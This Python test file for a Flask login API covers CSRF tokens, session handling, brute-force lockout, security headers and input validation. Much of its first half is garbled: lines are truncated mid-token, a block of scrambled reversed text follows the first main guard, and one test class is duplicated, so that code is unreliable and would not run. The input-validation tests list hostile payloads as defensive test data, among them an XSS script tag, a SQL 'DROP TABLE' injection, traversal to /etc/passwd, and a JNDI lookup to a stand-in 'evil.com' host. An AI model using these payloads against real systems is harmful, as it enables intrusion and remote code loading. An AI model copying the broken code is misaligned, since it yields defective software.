#!/usr/bin/env python3
"""
Security validation tests for CSRF protection and session hijacking prntion.
Tests various security attack scenarios and validates protection mechanisms.
"""

import unittest
import json
import time
import tempfile
import shutil
import os
import sys
import secrets
import hashlib
from unittest.mock import patch, MagicMock
from datetime import datetime, timedelta

# Add the current directory to Python path for imports
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from poi_api import app
from auth_config import auth_config
from auth_middleware import auth_middleware
import bcrypt

class TestCSRFProtection(unittest.TestCase):
    """Test CSRF (Cross-Site Request Forge
    
    def setUp(self):
        """Set up test environment."""
        self.app = app
        self.app.config['TESTING'] = True
        self.app.config['WTF_CSRF_ENABLED'] ests
        ()
        
        # Create temporary directory for sessions
        self.temp_dir = tempfile.mkdtemp()
        self.app.config['SESSION_FILE_DIR'] = selfdir
        
        # Set up test password
        self.test_passworord123!"
        
        auth_config.PASSWORD_HA
            self.test_password.encode('utf-8'),
    =4)
        ).decode('utf-8')
        
        # Clear failed attempts
    lear()
    
    def tearDown(self):
        """Clean up after test."""
        auth_configash
        shutil.rmtree(self)
    
    def _login_and_get_csrf_token(self):
        """H
        login_data = {
            'password': self.test_pass
            se
        }
        
        response = self.client.post('/auth/loin',
                                  data=json.dumps(login_data),
            )
        
        e, 200)
        login_response = json.loads(response.data)
        return login_response['csrf_token']
    
    def test_csrf_token_n(self):
        """
        # Get multiple CSRF tokens
        tokens = []
        
        for i in range(5):
            response = self.client.get('/auth/csr
    0)
            
            data = json.loads(response.data)
            token = d
            
            # Verify token properties
            self.assertIsNotNone
          str)
        long
            
            tokens.append(token)
        
        
        unique_tokens = set(tokens)
        self.assertGreaterEqual(len(unique_tokens)ue")
    
    def 
        """Test CSRF protection on logout e
        csrf_token = self._login_and_get_csrf_token)
        
        # Test 1: Logout without CSRF token (should fail)
        = {}
        response = self.client.post('/auth/logout',
                                  data=ja),
                                  content_type='applicatio
        
        self.assertEqual(response.status_code, 403)
        data = json.loads(response.data)
        
        
        # Test 2: Logout with invalid CSRF token (should fail)
        logout_data = {'csrf_token': 'invalid_token_12345'}
        out',
                                  data=json.dumps(l
                                  contenjson')
        
        
        data = json.loads(response.data)
        self.assertIn('Invalid CSRF token', data['erro
        
        # Test 3: Logout with valid CSRF token (sho)
        logout_data = {'csrf_token': csrf_token}
        response = self.client.post('/auth/logout',
        
                                  content_type='appn')
        
        self.assertEqual(response.status, 200)
    ata)
        self.assertTrue(data['success'])
    
    def test_csrf_proelf):
        """Test CSRF p
        csrf_token = self._login_and_get_cs
        
        n
        
        # Test 1: Password change without CSRF tokl)
        change_data = {
            'current_password': self.test_password,
        
            'confirm_password': new_password
        }
        
        word',
                                  data=j
        n')
        
        self.assertEqua3)
        data = json.loads(response.data)
        self.assertIn('Invalid CSRF token])
        
        #il)
        _12345'
        response = self.client.post('/auth/change-password',
                                  data=json.dumps(change_data),
                                  content_type='application/json')
        
        self.assertEqual(response.status_code, 403)
        data = json.loads(response.data)
        self.assertIn('Invalid CSRF token', data['error'])
        
        # Test 3: Password change with valid CSRF token (
        change_data['csrf_token'] = csrf_token
        ,
                                  data=json.dumps(change_data),
                                  content_type='application/jso
        
        
        data = json.loads(response.data)
        self.assertTrue(data['success'])
    
    def 
        """Test that CSRF tokens are invalidated after logout."""
        csrf_token = self._login_and_get_csrf_token()
        
        # Logout with valid token
        logout_data = {'csrf_token': csrf_token}
        response = self.client.post('/auth/logout',
        ata),
                                  content_type='app/json')
        
        self.assertEqual(response.status
     
        # Try to use the same token after logout (should
        # First login again
        login_data = {
            'password'd,
            'remember_me': False
        }
        
        n',
                        data=json.dumps(login_data
                        content_type='application/json')
        
        ld token
        logout_data = {'csrf_token': csrf_token}
        response = self.client.post('/auth/logout',
        out_data),
                on')
        
        rated
        self.assertEqual(response.status_code, 403)
    
    def test_csrf_double_submit_cookie_pattern(self):
        """
        # This test verifies that CSRF tokens are pidated
        s
        
        csrf_token = self._login_and_get_csrf
        
        # Create a modified token (simulating CSRF attack)
        modified_token = csrf_token[:-4] + "FAKE"
        
        logout_data = {'csrf_token'ed_token}
        response = self.client.post('/auth/logout',
                                  data=json.dumps(logout_data),
                                  content_type='application/json')
        
        self.assertEqual(response.status_code, 403)

r'])


clas):
    """Test session 
    
    def setUp(self):
        """Set up test environment."""
        self.app = app
        
        self.client = self.app
        
        # Create temporary directory for sessions
        self.temp_dir = tempfile.mkdtemp()
        self.app.config['SESSION_FILE_DIR'] = sdir
        
        # Set up test password
        
        self.original_password_
        auth_config.PASSWORD_HASH = bcrypt.hashw(
    utf-8'),
            bcrypt.gens
        ).decode('utf-8')
        
    mpts
        auth_middleware.failed_attempts.clear()
    
    def tearDown(self):
        """Clean up after test."""
        auth_config.PASSWORD_HASH = self.original_password_hash
        True)
    
    def test_session_r
        """Test that session ID is regenera
        # Get initial session
        rus')
        ')
        
        # Login
        login_data = {
        
            'remember_me': False
        
        
        response = self.client.post('/auth/login',
                                  data=json.dumps(logdata),
        on')
        
        self.assertEqual(response.status_code, 200)
        
        # Check if session cookie was set/updated
    )
        
        # Should have session-related cookies
        session_cookie_found = any('ses
        self.assertTrue(session_cookie_found, "Sessionlogin")
    
    def 
        """T"""
        # Set very  testing
        original_timeout =OUT
        auth_config.SESSION_TIMEOUT = 1  # 1 se
        
        try:
            Login
            login_data = {
                'password': self.test_password,
                'remember_me': False
            }
            
            ,
                                      data=json
                                      content_type='apon')
            
            self.assertEqual(response.status_code, 200)
            
            # Verify authenticated
            response = se)
            .data)
            self.assertTrue(data['authenticated)
            
            # Wait for timeout
            time.sleep(2)
            
            # Shout
            response = self.client.get
            data = json.loads(response.data)
    
            
        finally:
            auth_config.SESSION_TIMEOUT = original_timeout
    
    def test_session_fixation_prevention:
        
        # Get initial ion ID
        response = self.client.get('/auth/s)
        initial_session_data = jonse.data)
        
        ssion)
        login_data = {
            'password': self.test_password,
            'remember_me': False
        }
        
        response = self.client.post('/auth/login',
                                  data=json.dumps(login_data),
                                  content_type='application/jso
        
        self.assertEqual(response.status_code, 200)
        
        
        response = self.client.get('/au
        new_session_data = json.loads(response.data)
        
        ow
        self.assertTrue(new_session_data'])
        
        )
        if initial_session_data.get('csrf_token
            self.assertNotEqual(
        n'],
                new_session_data['csrf_to'],
                "CSRF token should change on login to prevent session"
    )
    
    def test_concurrent_session_handling(self):
        """Test handling of concurrent sessions""
        # Create two separate clients (simulating diffowsers)
        client1 = self.app.test_client()
        ()
        
        login_data = {
            'password': self.test_password,
        alse
        }
        
        # Login with first client
        response1 = client1.postogin',
         ata),
        on')
        
        self.assertEqual(response1.status_code, 200)
        
        nd client
        response2 = client2.post('/auth/login',
        
                                content_type='appon')
        
        self.assertEqual(response2.status_code, 200)
        
        # Both sessions should be valid (concurrent sessions allowed)
        status1 = client1.get('/auth/status')
    s')
        
        data1 = json.loads(status1.data)
        data2 = json.loads(status2.data)
        
        self.assertTrue(data1['authenticate)
        self.assertTrue(data2['aicated'])
        
        ferent
        self.assertNotEqual(data1['csrf_token'], da])
    
    def test_session_cookie_security_attributes(se:
        """Test that session cookies have proper security attr"""
        # Login to create session
        login_data = {
        d,
            'remember_me': False
        }
        
        response = self.client.post('/auth/login',
                                  data=jta),
                                  content_typeson')
        
        self.assertEqual(response.status_code, 200)
        


        
        session_cookie = None
    s:
            if 'sess
                session_cookie = cookie
                break
        
        if session_cookie:
        s
            self.assertIn('Htt
            # Note: Secure flag might not be seonment
            # self.assertIn('Secure', session_cookie, "Session )
            
            # Check SameSite attribute
            self.assertIn('SameSite'


class TestBruteForceProtection(
    """Test brute force attack protection mecha
    
    def setUp(self):
        """Set up test environment."""
        self.app = app
        e
        self.client = self.app.test_client()
        
    rd
        self.test_passw
        self.original_password_hasRD_HASH
        auth_config.PASSWORD_HASH = bcrypt.hashpw(
            self.test_password.encode('utf-8'),
            bcrypt.gensalt(rounds=4)
        
        
        # Clear failed attempts
    )
        
        # Set shorter timeouts for testing
        self.original_TS
        self.original_lockout_duration = ON
        
        aPTS = 3
        ting
    
    def ):
        """Clean up after test."""
        auth_config.PASSWO
        auth_config.MAX_LOGIN_ATTEMPmpts
        authon
        auth_middleware.failed_attempts.clear()
    
    def test_progressive_delay_implementation(self):
        """T"
        wrong_password = "WrongPas23!"
        
        # Track response times
        resps = []
        
        for i in range(3):
            ime()
            
            login_data = {
        rd,
                'remember_me': False
            }
            
    n',
                                      data
                                      cont
            
            end_time = time.time()
            response_time = end_time - start_time
            e_time)
            
            # Should be 401 for invalid passwrd
            self.assertEqual(respons
            
            ts
            time.sleep(0.1)
        
        # Later attempts should take longer due to progressive delays
        # (Note: This might be flaky in fast test environments)
        = 3:
            # At least the last attempt 
            self.assertGreater(response_times[-1], resp- 0.5)
    
    def test_ip_based_rate_limiting(self):
        """Test that rate limiting is applied per IP addres"
        "
        
        # Simulate requests from different IPs
        with patch('flask.request') as mock_request:
        
            mock_request.environ = {'HTTP_
            mock_request.remote_addr = '192.168.1.100'
            mock_request.is_json = True
    {
                'password': wrong_password,
                'remember_me': False
            }
            mock_request.headers = {'User}
            
         + 1):
        ta = {
                    'password': wrong_password,
                    'remember_me': False
                }
                
                response = self.client.post('/auth/login',
                           ),
        
                
                time.sleep(0.1)
            
            # Last attempt should be rate limited
        29)
            
            # Second IP - should still bempt
            mock_request.environ = {'HTTP_X_FORWARDED_101'}
        .1.101'
            
            login_data = {
        d,
                'remember_me': False
            }
            
            response = self.client.post('/auth/login',
        _data),
                                      content_type='application/json')
    
            # Should be 401 (invalid password) not 4
            self.assertEqual(response.status_code, 401)
    
    def test_lockout_recover:
        """Test recovery after lockout pe
        wrong_password = "WrongPd123!"
        
        out
        for i in range(auth_config.MAX_LOGIN_ATTEMPT):
            login_data = {
                'password': wrong_password,
                'remember_me': False
            }
            
        ogin',
                                
                              on')
            
            time.sleep(0.1)
        
        ocked out
        self.assertEqual(response.status_code, 429
        
        # Wait for lockout to expire
        
        
        
        login_daa = {
            'password': wrong_password,
            'remember_me': False
        
        
        response = self.client.post('/auth/login',
                                  data=json.dumps(login_
        son')
        
        # Should be 401 (invalid password) not 429 (rated)
        self.assertEqual(response.status_code, 401)
    
    def test_successful_login_clears_attempts(self):
        """Test that successful login clears failed at"
        wrong_password = "WrongPassword123!"
        
s
e(2):
            login_data = {
                'password': wrong_password,
    alse
            }
            
            response =
                                      dat_data),
                                      conten
          
            self.assertEqual(r 401)
            time.sleep(0.1)
        
        # Successful login
        login_data = {
            'password': self.test_pa
            'remember_me'
       }
        
        response = self.client.pos
                                  data=json.dumps(login_data),
    json')
        
        self.assertEqual(response.status_code, 200)
        
        out
        login_response = json.loads(resnse.data)
        csrf_token = login_response['csrf_token']
        
        logout_data = {'csrf_token': csrf_token}
        self.client.post('/auth/logout',
        data),
                        content_t')
        
        
        for i in range(2):
            login_data = {
                'password': wrong_password,
    e
            }
            
            response = self.client.post('/auth/login',
        ,
                                      content_typ
            
            # Should be 401, not 429 d)
            self.assertEqual(response.stat, 401)
            time.sleep(0.1)


class TestSecurityHeaders(unittest.TestCase):
    """Test security headers implementation."""
    
    def s
        ""
        self.app = app
        self.app.config['TESTING'] = True
        self.client = self.app.test_client()
    
    def test_security_headers_presence(self):
    """
        endpoints_to_test = [
            '/auth/status',
            '/auth/cs',
        ]
        
        required_headers = {
         ,
        
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; in
        }
        
        for endpoint in endpoints_to_test:
            with self.subTest(endpoint=endpoint):
                response = self.client.get(endpoi)
        
                for header_name, expected_value):
                    sel
                                f"Security header '
                    
                    actual_value = response.headers
                    self.assertEquale,
         
    
    def test_content_security_policy(self):
        """Test Content Security Policy header."""
        response = self.client.get('/auth/status')
        
        if 'Content-Security-Policy' in response.headers:
            csp = response.headers['Cont]
            
        ctives
            self.assertIn("default-src", csp, "CSP shou
            self.assertve")
            self.assertIn("style-src", csp, "CSP should htive")
    
    def test_cache_control_headers(self):
        """Test cache control header
        s
        
            '/auth/csrf-token',
        ]
        
        
            with self.subTest(endpoint=endpoint):
                response = self.client.g
                
    s
                cache_headers = ['Cache-Control', 'Pragma', 'ires']
                cache_header_found = any(header in response.headers for heders)
                
                self.assertTrue(cache_he
                              f"Endpointers")


if __name__ == '__main__':
    print("🛡️  Security Validat Tests")
    print
    
    # Run tests with detailed out
    unittest.main(verbosity=2, buffer=True)put"=" * 50)(iontrol heade cache con} should hav {endpointd,ader_founache_heaader in cExpol header contrd have cachehoul  # S          ndpoint)et(ents:tive_endpoinsi seint inor endpof',/statusuth  '/a  ts = [poinsitive_enden"""s.endpointe  sensitivs forsrc direcave style-ectiript-src dir have sc"CSP should, csp, ript-src"scIn("e")c directivult-sre defald havCSP direportant or imck f  # Che  ty-Policy'rient-Secuendpoint}")lue in {has wrong var_name}' '{heade header itySecur    f"                      lu_vacted expectual_value,(ae][header_nam}")om {endpoint missing freader_name}'{haders,esponse.he reader_name,ssertIn(hf.aaders.items(uired_hereq in         ntns',SubDomaicludeENY',ptions': 'D 'X-Frame-O   ff'': 'nosniType-Optionstent-   'X-Conkenrf-to present.s areurity headeruired sec all req"Test that  ""  ."nvironmentt e teset up"""Self):etUp(sus_codeearee clmpts werg atteincatindi(n/json')tioicae='applata)ogin_d(lon.dumps     data=js                         alsmber_me': Fme        're    koutmmediate locout iwith again mptsttefailed ato make e ld be abl# Shoucation/json='appliypemps(logout_=json.dudata                poog# Lication/pe='applontent_ty      c                        ogin',th/l('/aut : Falsessword,code,atus_stnse.espo  ')ion/jsonatlic'apppe=t_tygin(loson.dumpsa=jlogin',ost('/auth/.client.p selfber_me': Fem'rem            ngor i in ra        fmptatte failed ke some    # Ma    .""temptse limitation/j'applicnt_type=conte                          data),}td)orwrong passw with ll (though sti again attempt be able to# ShouldN + 1)TIOLOCKOUT_DURAh_config.me.sleep(autti)d be l Shoul#n/jslicatio'appontent_type=  c      a),_datps(login=json.dum data     auth/l('/t.postelf.clien sonse =    response.status_code, 401)
            time.sleep(0.1)
        
        # Now login successfully
        correct_login_data = {
            'password': self.test_password,
            'remember_me': False
        }
        
        response = self.client.post('/auth/login',
                                  data=json.dumps(correct_login_data),
                                  content_type='application/json')
        
        self.assertEqual(response.status_code, 200)
        
        # Logout
        login_response = json.loads(response.data)
        logout_data = {'csrf_token': login_response['csrf_token']}
        
        self.client.post('/auth/logout',
                        data=json.dumps(logout_data),
                        content_type='application/json')
        
        # Failed attempts should be cleared, so we can make more attempts
        for i in range(auth_config.MAX_LOGIN_ATTEMPTS):
            response = self.client.post('/auth/login',
                                      data=json.dumps(wrong_login_data),
                                      content_type='application/json')
            if i < auth_config.MAX_LOGIN_ATTEMPTS - 1:
                self.assertEqual(response.status_code, 401)
            time.sleep(0.1)


class TestPasswordSecurity(unittest.TestCase):
    """Test password security measures."""
    
    def setUp(self):
        """Set up test environment."""
        self.app = app
        self.app.config['TESTING'] = True
        self.client = self.app.test_client()
        
        # Set up test password
        self.test_password = "TestPassword123!"
        self.original_password_hash = auth_config.PASSWORD_HASH
        auth_config.PASSWORD_HASH = bcrypt.hashpw(
            self.test_password.encode('utf-8'),
            bcrypt.gensalt(rounds=4)
        ).decode('utf-8')
    
    def tearDown(self):
        """Clean up after test."""
        auth_config.PASSWORD_HASH = self.original_password_hash
    
    def test_password_hash_strength(self):
        """Test that password hashes are properly generated."""
        from poi_api import validate_password_strength
        
        # Test password hash properties
        password_hash = auth_config.PASSWORD_HASH
        
        # Should be bcrypt hash (starts with $2b$)
        self.assertTrue(password_hash.startswith('$2b$'))
        
        # Should be proper length
        self.assertGreater(len(password_hash), 50)
        
        # Should verify correctly
        self.assertTrue(bcrypt.checkpw(self.test_password.encode('utf-8'), 
                                     password_hash.encode('utf-8')))
    
    def test_password_strength_validation(self):
        """Test password strength validation rules."""
        from poi_api import validate_password_strength
        
        # Test cases: (password, should_be_valid)
        test_cases = [
            ('StrongPass123!', True),
            ('short', False),  # Too short
            ('nouppercase123!', False),  # No uppercase
            ('NOLOWERCASE123!', False),  # No lowercase
            ('NoNumbers!', False),  # No numbers
            ('NoSpecialChars123', False),  # No special characters
            ('password123', False),  # Common weak password
            ('A' * 129, False),  # Too long
        ]
        
        for password, should_be_valid in test_cases:
            with self.subTest(password=password):
                result = validate_password_strength(password)
                self.assertEqual(result['valid'], should_be_valid,
                               f"Password '{password}': {result['message']}")
    
    def test_password_change_security(self):
        """Test security measures in password change process."""
        # Login first
        login_data = {
            'password': self.test_password,
            'remember_me': False
        }
        
        response = self.client.post('/auth/login',
                                  data=json.dumps(login_data),
                                  content_type='application/json')
        
        self.assertEqual(response.status_code, 200)
        login_response = json.loads(response.data)
        csrf_token = login_response['csrf_token']
        
        # Test 1: Cannot reuse current password
        change_data = {
            'current_password': self.test_password,
            'new_password': self.test_password,
            'confirm_password': self.test_password,
            'csrf_token': csrf_token
        }
        
        response = self.client.post('/auth/change-password',
                                  data=json.dumps(change_data),
                                  content_type='application/json')
        
        self.assertEqual(response.status_code, 400)
        data = json.loads(response.data)
        self.assertIn('must be different', data['error'])
        
        # Test 2: Must provide correct current password
        change_data = {
            'current_password': 'wrong_current_password',
            'new_password': 'NewPassword456@',
            'confirm_password': 'NewPassword456@',
            'csrf_token': csrf_token
        }
        
        response = self.client.post('/auth/change-password',
                                  data=json.dumps(change_data),
                                  content_type='application/json')
        
        self.assertEqual(response.status_code, 401)
        data = json.loads(response.data)
        self.assertIn('Current password is incorrect', data['error'])
    
    def test_session_termination_after_password_change(self):
        """Test that all sessions are terminated after password change."""
        # Create multiple sessions (simulate multiple browsers)
        client1 = self.app.test_client()
        client2 = self.app.test_client()
        
        login_data = {
            'password': self.test_password,
            'remember_me': False
        }
        
        # Login with both clients
        response1 = client1.post('/auth/login',
                               data=json.dumps(login_data),
                               content_type='application/json')
        
        response2 = client2.post('/auth/login',
                               data=json.dumps(login_data),
                               content_type='application/json')
        
        self.assertEqual(response1.status_code, 200)
        self.assertEqual(response2.status_code, 200)
        
        # Both should be authenticated
        status1 = client1.get('/auth/status')
        status2 = client2.get('/auth/status')
        
        self.assertTrue(json.loads(status1.data)['authenticated'])
        self.assertTrue(json.loads(status2.data)['authenticated'])
        
        # Change password using client1
        login_response = json.loads(response1.data)
        csrf_token = login_response['csrf_token']
        
        change_data = {
            'current_password': self.test_password,
            'new_password': 'NewPassword456@',
            'confirm_password': 'NewPassword456@',
            'csrf_token': csrf_token
        }
        
        response = client1.post('/auth/change-password',
                              data=json.dumps(change_data),
                              content_type='application/json')
        
        self.assertEqual(response.status_code, 200)
        
        # Both sessions should now be terminated
        status1 = client1.get('/auth/status')
        status2 = client2.get('/auth/status')
        
        self.assertFalse(json.loads(status1.data)['authenticated'])
        self.assertFalse(json.loads(status2.data)['authenticated'])


class TestSecurityHeaders(unittest.TestCase):
    """Test security headers implementation."""
    
    def setUp(self):
        """Set up test environment."""
        self.app = app
        self.app.config['TESTING'] = True
        self.client = self.app.test_client()
    
    def test_security_headers_presence(self):
        """Test that all required security headers are present."""
        response = self.client.get('/auth/status')
        
        required_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000; includeSubDomains',
        }
        
        for header, expected_value in required_headers.items():
            self.assertIn(header, response.headers,
                         f"Security header '{header}' is missing")
            
            if expected_value:
                self.assertEqual(response.headers[header], expected_value,
                               f"Security header '{header}' has incorrect value")
    
    def test_content_security_policy(self):
        """Test Content Security Policy header."""
        response = self.client.get('/auth/status')
        
        if 'Content-Security-Policy' in response.headers:
            csp = response.headers['Content-Security-Policy']
            
            # Should contain basic CSP directives
            self.assertIn('default-src', csp)
            
            # Should restrict unsafe inline scripts
            if 'script-src' in csp:
                self.assertNotIn("'unsafe-inline'", csp)
    
    def test_cache_control_headers(self):
        """Test cache control headers for sensitive endpoints."""
        sensitive_endpoints = [
            '/auth/status',
            '/auth/csrf-token'
        ]
        
        for endpoint in sensitive_endpoints:
            with self.subTest(endpoint=endpoint):
                response = self.client.get(endpoint)
                
                # Should have cache control headers
                cache_headers = ['Cache-Control', 'Pragma', 'Expires']
                
                for header in cache_headers:
                    if header in response.headers:
                        # Verify no-cache directives
                        if header == 'Cache-Control':
                            self.assertIn('no-cache', response.headers[header])
                        elif header == 'Pragma':
                            self.assertEqual(response.headers[header], 'no-cache')


class TestInputValidation(unittest.TestCase):
    """Test input validation and sanitization."""
    
    def setUp(self):
        """Set up test environment."""
        self.app = app
        self.app.config['TESTING'] = True
        self.client = self.app.test_client()
        
        # Set up test password
        self.test_password = "TestPassword123!"
        self.original_password_hash = auth_config.PASSWORD_HASH
        auth_config.PASSWORD_HASH = bcrypt.hashpw(
            self.test_password.encode('utf-8'),
            bcrypt.gensalt(rounds=4)
        ).decode('utf-8')
    
    def tearDown(self):
        """Clean up after test."""
        auth_config.PASSWORD_HASH = self.original_password_hash
    
    def test_malicious_input_handling(self):
        """Test handling of malicious input attempts."""
        malicious_inputs = [
            '<script>alert("xss")</script>',
            '"; DROP TABLE users; --',
            '../../../etc/passwd',
            '${jndi:ldap://evil.com/a}',
            '\x00\x01\x02',  # Null bytes
            'A' * 10000,  # Very long input
        ]
        
        for malicious_input in malicious_inputs:
            with self.subTest(input=malicious_input[:50]):  # Truncate for readability
                login_data = {
                    'password': malicious_input,
                    'remember_me': False
                }
                
                response = self.client.post('/auth/login',
                                          data=json.dumps(login_data),
                                          content_type='application/json')
                
                # Should handle gracefully (not crash)
                self.assertIn(response.status_code, [400, 401, 500])
                
                # Response should not contain the malicious input
                response_text = response.data.decode('utf-8', errors='ignore')
                self.assertNotIn('<script>', response_text.lower())
    
    def test_json_injection_prevention(self):
        """Test prevention of JSON injection attacks."""
        # Test malformed JSON
        malformed_json_inputs = [
            '{"password": "test", "extra": }',  # Invalid JSON
            '{"password": "test"} {"password": "test2"}',  # Multiple JSON objects
            '{"password": "test", "password": "test2"}',  # Duplicate keys
        ]
        
        for json_input in malformed_json_inputs:
            with self.subTest(json_input=json_input):
                response = self.client.post('/auth/login',
                                          data=json_input,
                                          content_type='application/json')
                
                # Should handle gracefully
                self.assertIn(response.status_code, [400, 500])
    
    def test_parameter_pollution(self):
        """Test handling of parameter pollution attacks."""
        # Test with form data containing duplicate parameters
        form_data = 'password=wrong&password=correct&remember_me=false&remember_me=true'
        
        response = self.client.post('/auth/login',
                                  data=form_data,
                                  content_type='application/x-www-form-urlencoded')
        
        # Should handle gracefully and not be confused by duplicate parameters
        self.assertIn(response.status_code, [400, 401])


if __name__ == '__main__':
    print("🛡️  Security Validation Tests")
    print("=" * 50)
    
    # Run tests with detailed output
    unittest.main(verbosity=2, buffer=True)